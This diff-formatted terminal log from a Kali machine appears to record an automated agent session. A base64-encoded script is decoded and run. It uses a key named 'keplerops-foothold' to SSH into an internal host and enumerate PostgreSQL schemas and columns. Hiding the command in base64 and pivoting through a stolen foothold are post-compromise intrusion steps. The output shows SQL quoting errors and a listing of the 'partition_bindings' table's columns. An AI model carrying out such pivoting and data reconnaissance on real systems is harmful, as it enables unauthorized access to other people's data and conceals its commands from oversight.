@@ -1,0 +1,36 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/pg2.sh <<'B64EOF'
+> IyEvYmluL2Jhc2gKUz0ic3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBCYXRjaE1vZGU9eWVzIC1pIH4vLnNzaC9rZXBsZXJvcHMtZm9vdGhvbGQgLXAgMjIyMiByb3dhbkAxMC41MC4xMy4xODAiCiRTICdmb3IgcyBpbiBleHBvcnQgcHVibGljIHN1cHBvcnQgd29ya3NwYWNlOyBkbyBlY2hvICIjIyMjIyBzY2hlbWEgJHMiOyBwc3FsIHNlcnZpY2U9ZmllbGRsaW5rIC1BdGMgInNlbGVjdCB0YWJsZV9zY2hlbWF8fCcuJ3x8dGFibGVfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPSciJyInJHMnIiciJyBvcmRlciBieSAxIjsgZG9uZTsgZWNobyAiIyMjIyMgd29ya3NwYWNlIGNvbHMiOyBwc3FsIHNlcnZpY2U9ZmllbGRsaW5rIC1jICJzZWxlY3QgdGFibGVfbmFtZSxjb2x1bW5fbmFtZSxkYXRhX3R5cGUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9zY2hlbWEgaW4gKCciJyInc3VwcG9ydCciJyInLCciJyInd29ya3NwYWNlJyInIicsJyInIidleHBvcnQnIiciJykgb3JkZXIgYnkgMSwyIiAnCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/pg2.sh; bash /tmp/pg2.sh; echo DONEMARK_1795200180111$((6*7))
+##### schema export
+ERROR:  syntax error at or near "."
+LINE 1: select table_schema||.||table_name from information_schema.t...
+                             ^
+##### schema public
+ERROR:  syntax error at or near "."
+LINE 1: select table_schema||.||table_name from information_schema.t...
+                             ^
+##### schema support
+ERROR:  syntax error at or near "."
+LINE 1: select table_schema||.||table_name from information_schema.t...
+                             ^
+##### schema workspace
+ERROR:  syntax error at or near "."
+LINE 1: select table_schema||.||table_name from information_schema.t...
+                             ^
+##### workspace cols
+     table_name     |    column_name     | data_type 
+--------------------+--------------------+-----------
+ partition_bindings | connector_revision | text
+ partition_bindings | export_id          | text
+ partition_bindings | is_current         | boolean
+ partition_bindings | partition_id       | text
+ partition_bindings | revision           | integer
+ partition_bindings | tenant             | text
+(6 rows)
+
